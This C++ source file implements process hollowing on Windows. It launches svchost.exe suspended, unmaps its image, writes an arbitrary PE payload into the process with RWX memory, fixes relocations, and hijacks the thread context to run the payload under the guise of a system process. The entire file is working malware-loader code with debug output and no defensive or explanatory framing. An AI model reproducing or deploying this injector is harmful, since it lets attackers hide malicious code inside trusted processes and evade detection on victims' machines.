#include "../includes/startInjection.h"

using namespace std;

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

// Structure to hold addresses in the target process
struct ProcessAddressInformation {
    LPVOID lpProcessPEBAddress;
    LPVOID lpProcessImageBaseAddress;
};

// Helper function to get the PEB address and ImageBaseAddress
ProcessAddressInformation GetProcessAddressInformation(HANDLE hProcess) {
    ProcessAddressInformation addressInfo = {nullptr, nullptr};

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        cerr << "[error] Failed to get handle for ntdll.dll.\n";
        return addressInfo;
    }

    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        cerr << "[error] Failed to get NtQueryInformationProcess address.\n";
        return addressInfo;
    }

    PROCESS_BASIC_INFORMATION pbi;
    ULONG len;
    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &len) != 0) {
        cerr << "[error] Failed to get process basic information.\n";
        return addressInfo;
    }

    addressInfo.lpProcessPEBAddress = pbi.PebBaseAddress;

    // Read ImageBaseAddress from the PEB structure
    PVOID imageBaseAddress;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBaseAddress, sizeof(PVOID), &bytesRead)) {
        cerr << "[error] Failed to read ImageBaseAddress from PEB.\n";
        return addressInfo;
    }

    addressInfo.lpProcessImageBaseAddress = imageBaseAddress;
    return addressInfo;
}



// Unmap the existing executable and allocate space for the new one
void UnmapAndAllocate(HANDLE hProcess, PVOID imageBase, size_t imageSize) {
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

    NtUnmapViewOfSection(hProcess, imageBase);
    VirtualAllocEx(hProcess, imageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

// Perform the process hollowing
bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
    cout << "[debug] Starting RunPE...\n";

    auto* dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
    auto* ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uintptr_t>(dosHeader) + dosHeader->e_lfanew);

    ProcessAddressInformation addressInfo = GetProcessAddressInformation(hProcess);
    if (!addressInfo.lpProcessImageBaseAddress) {
        cerr << "[error] Failed to get process image base address.\n";
        return false;
    }

    cout << "[debug] Target process image base address: " << addressInfo.lpProcessImageBaseAddress << "\n";

    UnmapAndAllocate(hProcess, addressInfo.lpProcessImageBaseAddress, ntHeaders->OptionalHeader.SizeOfImage);

    cout << "[debug] Writing headers...\n";
    if (!WriteProcessMemory(hProcess, addressInfo.lpProcessImageBaseAddress, lpImage, ntHeaders->OptionalHeader.SizeOfHeaders, nullptr)) {
        cerr << "[error] Failed to write headers. Error: " << GetLastError() << "\n";
        return false;
    }

    cout << "[debug] Writing sections...\n";
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders) + i;
        if (section->SizeOfRawData == 0) continue;

        LPVOID pRemoteSection = reinterpret_cast<PBYTE>(addressInfo.lpProcessImageBaseAddress) + section->VirtualAddress;
        LPVOID pLocalSection = reinterpret_cast<PBYTE>(lpImage) + section->PointerToRawData;
        if (!WriteProcessMemory(hProcess, pRemoteSection, pLocalSection, section->SizeOfRawData, nullptr)) {
            cerr << "[error] Failed to write section " << i << ". Error: " << GetLastError() << "\n";
            return false;
        }
    }

    cout << "[debug] Applying relocations...\n";
    DWORD_PTR delta = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress) - ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
            (PBYTE)lpImage + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress != 0) {
            DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocEntries = reinterpret_cast<PWORD>((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < numEntries; i++) {
                if (relocEntries[i] == 0) continue;

                int type = relocEntries[i] >> 12;
                int offset = relocEntries[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    DWORD_PTR* patchAddr = reinterpret_cast<DWORD_PTR*>(
                        reinterpret_cast<PBYTE>(addressInfo.lpProcessImageBaseAddress) + reloc->VirtualAddress + offset);

                    DWORD_PTR originalAddr;
                    ReadProcessMemory(hProcess, patchAddr, &originalAddr, sizeof(DWORD_PTR), nullptr);
                    DWORD_PTR newAddr = originalAddr + delta;
                    WriteProcessMemory(hProcess, patchAddr, &newAddr, sizeof(DWORD_PTR), nullptr);
                }
            }
            reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>((PBYTE)reloc + reloc->SizeOfBlock);
        }
    }

    cout << "[debug] Setting thread context...\n";
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
#ifdef _WIN64
    ctx.Rip = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress) + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eip = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress) + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    cout << "[debug] Thread resumed successfully.\n";

    return true;
}


void startInjection(unsigned char data[], unsigned int data_len) {
    cout << "[debug] Starting payload injection.\n";
    cout << "[debug] Payload size: " << data_len << ".\n";

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", 
        nullptr, 
        nullptr, 
        nullptr, 
        FALSE, 
        CREATE_SUSPENDED, 
        nullptr, 
        nullptr, 
        &si, 
        &pi)) {
        cerr << "[error] Failed to create target process. Error: " << GetLastError() << "\n";
        return;
    }

    cout << "[debug] Target process created. PID: " << pi.dwProcessId << ".\n";

    if (!RunPE(pi.hProcess, pi.hThread, data, data_len)) {
        cerr << "[error] Process hollowing failed.\n";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    cout << "[debug] Payload executed successfully.\n";

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
